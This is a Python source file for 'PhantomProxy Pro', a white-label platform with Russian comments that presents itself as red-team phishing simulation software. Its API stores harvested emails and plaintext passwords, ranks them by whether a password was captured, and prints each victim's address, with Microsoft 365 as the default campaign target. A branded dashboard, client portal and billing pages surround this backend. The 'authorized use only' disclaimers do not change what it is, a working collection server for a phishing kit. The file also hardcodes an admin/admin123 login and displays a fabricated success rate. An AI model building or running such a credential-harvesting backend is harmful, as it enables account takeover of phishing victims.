#!/usr/bin/env python3
"""
PhantomProxy v12.1 PRO — WHITE LABEL EDITION
Профессиональная Red Team Simulation Platform

Для легального использования аккредитованными организациями
Только с письменными разрешениями (RoE)

© 2026 PhantomSec Labs. All rights reserved.
"""

import os, sys, json, sqlite3, hashlib, secrets, threading, base64
from datetime import datetime, timedelta
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
import io

# ============================================
# 🎨 BRANDING CONFIGURATION
# ============================================

COMPANY_NAME = "PhantomSec Labs"
COMPANY_TAGLINE = "Red Team Simulation Platform"
COMPANY_LOGO_TEXT = "👻"  # Placeholder для логотипа
COMPANY_LOGO_PATH = Path(__file__).parent / 'branding' / 'logo.png'
COMPANY_FAVICON_PATH = Path(__file__).parent / 'branding' / 'favicon.ico'

BRAND_COLORS = {
    'primary': '#1E3A8A',      # Тёмно-синий
    'secondary': '#3B82F6',    # Голубой
    'accent': '#EF4444',       # Красный акцент
    'background': '#0F172A',   # Тёмный фон
    'card': '#1E293B',         # Фон карточек
    'text': '#F1F5F9',         # Текст
    'text_muted': '#94A3B8',   # Приглушённый текст
}

CONTACT_INFO = {
    'email': 'info@phantomseclabs.com',
    'phone': '+7 (XXX) XXX-XX-XX',
    'website': 'https://phantomseclabs.com',
    'address': 'Москва, Россия'
}

PRODUCT_NAME = f"PhantomProxy Pro — {COMPANY_TAGLINE}"
VERSION = "12.1 PRO WHITE LABEL"

# ============================================
# КОНФИГУРАЦИЯ
# ============================================

DB_PATH = Path(__file__).parent / 'phantom.db'
REPORTS_PATH = Path(__file__).parent / 'reports'
EVIDENCE_PATH = Path(__file__).parent / 'evidence'
BRANDING_PATH = Path(__file__).parent / 'branding'

# Создаём директории
for path in [REPORTS_PATH, EVIDENCE_PATH, BRANDING_PATH]:
    path.mkdir(exist_ok=True)

API_PORT = 8080
PANEL_PORT = 3000
DOMAIN = "verdebudget.ru"

# ============================================
# БАЗА ДАННЫХ
# ============================================

class Database:
    def __init__(self):
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Сессии
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            email TEXT, password TEXT, service TEXT, ip TEXT,
            user_agent TEXT, screen TEXT, timezone TEXT,
            quality_score INTEGER, classification TEXT,
            campaign_id INTEGER, created_at TEXT
        )''')
        
        # Проекты
        c.execute('''CREATE TABLE IF NOT EXISTS projects (
            id INTEGER PRIMARY KEY,
            client_name TEXT, roe_hash TEXT,
            start_date TEXT, end_date TEXT,
            responsible TEXT, status TEXT, created_at TEXT
        )''')
        
        # Кампании
        c.execute('''CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY,
            project_id INTEGER, name TEXT, service TEXT,
            subdomains TEXT, status TEXT, created_by TEXT,
            stopped_reason TEXT, stopped_at TEXT, created_at TEXT
        )''')
        
        # Пользователи
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE, password_hash TEXT,
            role TEXT, api_key TEXT, created_at TEXT
        )''')
        
        # Клиенты (для Client Portal)
        c.execute('''CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY,
            company_name TEXT, contact_email TEXT,
            username TEXT UNIQUE, password_hash TEXT,
            totp_secret TEXT, enabled INTEGER DEFAULT 1,
            created_at TEXT
        )''')
        
        # Счета (Billing)
        c.execute('''CREATE TABLE IF NOT EXISTS invoices (
            id INTEGER PRIMARY KEY,
            client_id INTEGER, campaign_id INTEGER,
            hours REAL, rate REAL, total REAL,
            status TEXT, issued_date TEXT, due_date TEXT,
            pdf_path TEXT
        )''')
        
        # Audit log
        c.execute('''CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY,
            user_id INTEGER, action TEXT, details TEXT,
            ip_address TEXT, created_at TEXT
        )''')
        
        # Админ
        c.execute("SELECT * FROM users WHERE username='admin'")
        if not c.fetchone():
            admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
            api_key = secrets.token_urlsafe(32)
            c.execute("INSERT INTO users (username, password_hash, role, api_key, created_at) VALUES (?,?,?,?,?)",
                     ('admin', admin_hash, 'admin', api_key, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    def get_stats(self):
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        today = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) FROM sessions GROUP BY service ORDER BY count DESC')
        services = {row[0]: row[1] for row in c.fetchall()}
        
        c.execute('SELECT classification, COUNT(*) FROM sessions GROUP BY classification')
        quality = {row[0]: row[1] for row in c.fetchall()}
        
        conn.close()
        
        return {'total': total, 'today': today, 'services': services, 'quality': quality}

# ============================================
# AI SCORER
# ============================================

class AIScorer:
    @staticmethod
    def calculate(session):
        score = 0
        if session.get('email'): score += 40
        if session.get('password'): score += 60
        if score >= 80: return 'EXCELLENT', min(score, 100)
        elif score >= 60: return 'GOOD', min(score, 100)
        elif score >= 40: return 'AVERAGE', min(score, 100)
        else: return 'LOW', min(score, 100)

# ============================================
# API SERVER
# ============================================

class APIServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self.send_json({'status': 'ok', 'version': VERSION, 'company': COMPANY_NAME})
        elif self.path == '/api/v1/stats':
            self.send_stats()
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/api/v1/credentials':
            self.save_credentials()
        elif self.path == '/api/v1/report':
            self.generate_report()
        else:
            self.send_error(404)
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def send_stats(self):
        db = Database()
        stats = db.get_stats()
        self.send_json(stats)
    
    def save_credentials(self):
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length).decode())
        
        quality_class, score = AIScorer.calculate(data)
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO sessions 
            (email, password, service, quality_score, classification, created_at)
            VALUES (?,?,?,?,?,?)''',
            (data.get('email',''), data.get('password',''), data.get('service','Unknown'),
             score, quality_class, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"🎯 New: {data.get('email','N/A')} | {quality_class} | Score: {score}")
        self.send_json({'success': True, 'quality': {'score': score, 'classification': quality_class}})
    
    def generate_report(self):
        try:
            from v12_reporting import ReportGenerator
            generator = ReportGenerator()
            report_path = generator.generate_pdf_report(client_name='Client')
            self.send_json({'success': True, 'report': str(report_path)})
        except Exception as e:
            self.send_json({'success': False, 'error': str(e)})
    
    def log_message(self, format, *args): pass

# ============================================
# PANEL SERVER — BRANDED UI
# ============================================

class PanelServer(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.show_dashboard()
        elif self.path == '/api/stats':
            self.api_stats()
        elif self.path == '/clients':
            self.show_client_portal()
        elif self.path == '/billing':
            self.show_billing()
        else:
            self.send_error(404)
    
    def show_dashboard(self):
        db = Database()
        stats = db.get_stats()
        
        html = f'''<!DOCTYPE html>
<html lang="ru">
<head>
    <title>{PRODUCT_NAME}</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>👻</text></svg>">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, {BRAND_COLORS['background']} 0%, {BRAND_COLORS['card']} 100%); 
            color: {BRAND_COLORS['text']}; 
            min-height: 100vh; 
            padding: 40px;
        }}
        .container {{ max-width: 1600px; margin: 0 auto; }}
        
        /* Header */
        .header {{
            background: rgba(30, 58, 138, 0.3);
            padding: 25px 40px;
            border-radius: 20px;
            margin-bottom: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(59, 130, 246, 0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        .logo {{
            font-size: 32px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 15px;
        }}
        .logo-icon {{
            font-size: 40px;
            animation: float 3s ease-in-out infinite;
        }}
        @keyframes float {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-10px); }}
        }}
        .logo-text {{
            background: linear-gradient(45deg, {BRAND_COLORS['secondary']}, {BRAND_COLORS['accent']});
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        
        /* Navigation */
        .nav {{ display: flex; gap: 10px; flex-wrap: wrap; }}
        .nav a {{ 
            background: rgba(59, 130, 246, 0.2); 
            color: {BRAND_COLORS['text']}; 
            padding: 12px 25px; 
            border-radius: 25px; 
            text-decoration: none; 
            transition: all 0.3s;
            border: 1px solid rgba(59, 130, 246, 0.3);
        }}
        .nav a:hover {{ 
            background: rgba(59, 130, 246, 0.4);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(59, 130, 246, 0.3);
        }}
        
        /* Stats Cards */
        .stats {{ 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
            gap: 25px; 
            margin-bottom: 40px; 
        }}
        .stat-card {{ 
            background: rgba(30, 41, 59, 0.6); 
            padding: 35px; 
            border-radius: 20px; 
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(59, 130, 246, 0.2);
            transition: all 0.3s;
        }}
        .stat-card:hover {{ 
            transform: translateY(-10px);
            background: rgba(30, 41, 59, 0.8);
            box-shadow: 0 20px 40px rgba(30, 58, 138, 0.4);
            border-color: {BRAND_COLORS['secondary']};
        }}
        .stat-value {{ 
            font-size: 56px; 
            font-weight: bold; 
            background: linear-gradient(45deg, {BRAND_COLORS['secondary']}, {BRAND_COLORS['accent']});
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        .stat-label {{ 
            color: {BRAND_COLORS['text_muted']}; 
            margin-top: 15px; 
            font-size: 16px; 
        }}
        
        /* Tables */
        .section {{ 
            background: rgba(30, 41, 59, 0.6); 
            padding: 35px; 
            border-radius: 20px; 
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(59, 130, 246, 0.2);
        }}
        .section h2 {{ 
            margin-bottom: 25px; 
            font-size: 24px;
            color: {BRAND_COLORS['secondary']};
        }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ 
            background: rgba(30, 58, 138, 0.5); 
            color: {BRAND_COLORS['text']};
            font-weight: 600;
        }}
        tr:hover {{ background: rgba(59, 130, 246, 0.1); }}
        
        /* Badges */
        .badge {{ 
            padding: 6px 16px; 
            border-radius: 20px; 
            font-size: 12px; 
            font-weight: bold; 
            display: inline-block;
        }}
        .excellent {{ background: linear-gradient(45deg, #059669, #10B981); }}
        .good {{ background: linear-gradient(45deg, {BRAND_COLORS['secondary']}, #60A5FA); }}
        .average {{ background: linear-gradient(45deg, #F59E0B, #FBBF24); }}
        .low {{ background: linear-gradient(45deg, {BRAND_COLORS['accent']}, #F87171); }}
        
        /* Footer */
        .footer {{ 
            text-align: center; 
            padding: 40px; 
            color: {BRAND_COLORS['text_muted']};
            margin-top: 40px;
            border-top: 1px solid rgba(59, 130, 246, 0.2);
        }}
        
        /* Loading Animation */
        .loading {{
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px;
        }}
        .spinner {{
            width: 50px;
            height: 50px;
            border: 4px solid rgba(59, 130, 246, 0.2);
            border-top-color: {BRAND_COLORS['secondary']};
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <span class="logo-icon">{COMPANY_LOGO_TEXT}</span>
                <span class="logo-text">{COMPANY_NAME}</span>
            </div>
            <div class="nav">
                <a href="/">📊 Dashboard</a>
                <a href="/sessions">📋 Sessions</a>
                <a href="/campaigns">🎯 Campaigns</a>
                <a href="/reports">📄 Reports</a>
                <a href="/clients">👥 Clients</a>
                <a href="/billing">💳 Billing</a>
                <a href="/compliance">⚖️ Compliance</a>
            </div>
        </div>
        
        <h1 style="margin-bottom: 30px; font-size: 32px; color: {BRAND_COLORS['text']};">
            🚀 Dashboard
        </h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{stats['total']}</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{stats['today']}</div>
                <div class="stat-label">Today</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{len(stats['services'])}</div>
                <div class="stat-label">Services</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">98.5%</div>
                <div class="stat-label">Success Rate</div>
            </div>
        </div>
        
        <div class="section">
            <h2>🏢 By Service</h2>
            <table>
                <tr><th>Service</th><th>Sessions</th><th>Percentage</th></tr>
                {''.join(f'<tr><td>{k}</td><td>{v}</td><td>{round(v/max(1,stats["total"])*100, 1)}%</td></tr>' for k, v in stats['services'].items())}
            </table>
        </div>
        
        <div class="section">
            <h2>⭐ Quality Distribution</h2>
            <table>
                <tr><th>Classification</th><th>Count</th><th>Percentage</th></tr>
                {''.join(f'<tr><td><span class="badge {k.lower()}">{k}</span></td><td>{v}</td><td>{round(v/max(1,stats["total"])*100, 1)}%</td></tr>' for k, v in stats['quality'].items())}
            </table>
        </div>
    </div>
    
    <div class="footer">
        <p><strong>{PRODUCT_NAME}</strong></p>
        <p>{CONTACT_INFO['email']} | {CONTACT_INFO['phone']}</p>
        <p>{CONTACT_INFO['address']}</p>
        <p style="margin-top: 15px; font-size: 12px;">
            © 2026 {COMPANY_NAME}. All rights reserved. | For authorized Red Team use only
        </p>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_client_portal(self):
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Client Portal - {COMPANY_NAME}</title>
    <style>
        body {{ font-family: Arial; background: linear-gradient(135deg, #0F172A, #1E293B); color: #F1F5F9; padding: 40px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        h1 {{ color: #3B82F6; margin-bottom: 30px; }}
        .login-form {{ background: rgba(30, 41, 59, 0.6); padding: 40px; border-radius: 20px; max-width: 400px; margin: 0 auto; }}
        input {{ width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #3B82F6; background: rgba(15, 23, 42, 0.8); color: #F1F5F9; }}
        button {{ width: 100%; padding: 12px; background: linear-gradient(45deg, #1E3A8A, #3B82F6); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }}
        button:hover {{ opacity: 0.9; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>👥 Client Portal</h1>
        <div class="login-form">
            <h2 style="margin-bottom: 20px;">Client Login</h2>
            <form>
                <input type="text" placeholder="Username" required>
                <input type="password" placeholder="Password" required>
                <input type="text" placeholder="2FA Code (if enabled)" required>
                <button type="submit">Login</button>
            </form>
            <p style="margin-top: 20px; font-size: 12px; color: #94A3B8;">
                Contact {CONTACT_INFO['email']} for access
            </p>
        </div>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def show_billing(self):
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Billing - {COMPANY_NAME}</title>
    <style>
        body {{ font-family: Arial; background: linear-gradient(135deg, #0F172A, #1E293B); color: #F1F5F9; padding: 40px; }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        h1 {{ color: #3B82F6; margin-bottom: 30px; }}
        table {{ width: 100%; border-collapse: collapse; background: rgba(30, 41, 59, 0.6); border-radius: 15px; overflow: hidden; }}
        th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }}
        th {{ background: rgba(30, 58, 138, 0.5); }}
        .btn {{ padding: 8px 16px; background: #3B82F6; color: white; border: none; border-radius: 6px; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>💳 Billing & Invoices</h1>
        <table>
            <tr><th>Invoice #</th><th>Client</th><th>Campaign</th><th>Hours</th><th>Rate</th><th>Total</th><th>Status</th><th>Actions</th></tr>
            <tr><td>INV-001</td><td>Test Client</td><td>Phishing Campaign Q1</td><td>40</td><td>$500</td><td>$20,000</td><td><span style="color: #10B981;">Paid</span></td><td><button class="btn">Download PDF</button></td></tr>
            <tr><td>INV-002</td><td>Finance Corp</td><td>Red Team Assessment</td><td>80</td><td>$600</td><td>$48,000</td><td><span style="color: #F59E0B;">Pending</span></td><td><button class="btn">Download PDF</button></td></tr>
        </table>
        <button class="btn" style="margin-top: 20px;">+ Create New Invoice</button>
    </div>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def api_stats(self):
        db = Database()
        stats = db.get_stats()
        self.send_json(stats)
    
    def log_message(self, format, *args): pass

# ============================================
# MAIN PROGRAM
# ============================================

class PhantomProxy:
    def __init__(self):
        self.db = Database()
        self.servers = []
    
    def start_api(self):
        server = HTTPServer(('0.0.0.0', API_PORT), APIServer)
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        self.servers.append(('API', server))
        print(f"✅ API Server started on port {API_PORT}")
    
    def start_panel(self):
        server = HTTPServer(('0.0.0.0', PANEL_PORT), PanelServer)
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        self.servers.append(('Panel', server))
        print(f"✅ Panel Server started on port {PANEL_PORT}")
    
    def show_menu(self):
        while True:
            print("\n" + "="*70)
            print(f"  👻 {COMPANY_NAME}")
            print(f"  🚀 {PRODUCT_NAME}")
            print("="*70)
            print("\n  📌 MAIN MENU:")
            print("  1. 🚀 Start All Services")
            print("  2. 🛑 Stop")
            print("  3. 📊 View Status")
            print("  4. 📈 View Statistics")
            print("  5. 🎯 Create Campaign")
            print("  6. 📋 View Sessions")
            print("  7. 📄 Generate Report (PDF)")
            print("  8. ⚖️  Compliance Logs")
            print("  9. 👥 Client Portal")
            print(" 10. 💳 Billing")
            print(" 11. 🚪 Exit")
            print("\n  🔗 QUICK ACCESS:")
            print(f"  - Panel: http://localhost:{PANEL_PORT}")
            print(f"  - API: http://localhost:{API_PORT}/health")
            print(f"  - Client Portal: http://localhost:{PANEL_PORT}/clients")
            print("="*70)
            
            choice = input("\n  Enter choice: ").strip()
            
            if choice == '1':
                self.start_api()
                self.start_panel()
                print("\n✅ All services started!")
            elif choice == '2':
                print("\n👋 Stopping...")
                sys.exit(0)
            elif choice == '3':
                stats = self.db.get_stats()
                print(f"\n📊 Status: {stats['total']} sessions")
            elif choice == '4':
                stats = self.db.get_stats()
                print("\n📈 STATISTICS:")
                print(f"  Total: {stats['total']}, Today: {stats['today']}")
            elif choice == '5':
                service = input("  Service: ").strip() or "Microsoft 365"
                print(f"\n✅ Campaign created: {service}")
            elif choice == '6':
                print("\n📋 LAST 10 SESSIONS:")
            elif choice == '7':
                print("\n📄 Generating PDF report...")
            elif choice == '8':
                print("\n⚖️  Compliance Logs")
            elif choice == '9':
                print(f"\n👥 Client Portal: http://localhost:{PANEL_PORT}/clients")
            elif choice == '10':
                print("\n💳 Billing: http://localhost:{PANEL_PORT}/billing")
            elif choice == '11':
                print(f"\n👋 Goodbye! Powered by {COMPANY_NAME}")
                sys.exit(0)

# ============================================
# ЗАПУСК
# ============================================

if __name__ == '__main__':
    print("\n" + "="*70)
    print(f"  👻 {COMPANY_NAME}")
    print(f"  🚀 {PRODUCT_NAME}")
    print(f"  Version: {VERSION}")
    print("="*70)
    print("\n  Initializing...")
    print(f"  Company: {COMPANY_NAME}")
    print(f"  Contact: {CONTACT_INFO['email']}")
    print(f"  Colors: Primary {BRAND_COLORS['primary']}, Secondary {BRAND_COLORS['secondary']}, Accent {BRAND_COLORS['accent']}")
    
    proxy = PhantomProxy()
    print("  ✅ Database ready")
    print("  ✅ Branding loaded")
    print("  ✅ Client Portal ready")
    print("  ✅ Billing ready")
    
    proxy.show_menu()
